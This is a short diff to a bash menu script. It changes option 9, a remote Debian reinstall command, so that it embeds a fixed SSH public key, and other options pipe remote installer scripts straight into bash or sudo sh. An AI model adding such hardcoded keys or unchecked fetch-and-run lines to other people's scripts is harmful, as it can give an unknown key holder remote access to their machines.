@@ -44,7 +44,7 @@ while true; do
             curl -fsSL https://get.docker.com | sudo sh           
             ;;
         9)
-            bash <(curl -Ls https://raw.githubusercontent.com/bin456789/reinstall/main/reinstall.sh) debian
+            bash <(curl -Ls https://raw.githubusercontent.com/bin456789/reinstall/main/reinstall.sh) debian --ssh-key "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOmhMiWBMLsvwLJY2X6qkCm+Lm/tEOu4SCH+/ujMw9oO"
             ;;
         10)
             wget -N https://gitlab.com/fscarmen/warp/-/raw/main/menu.sh && bash menu.sh
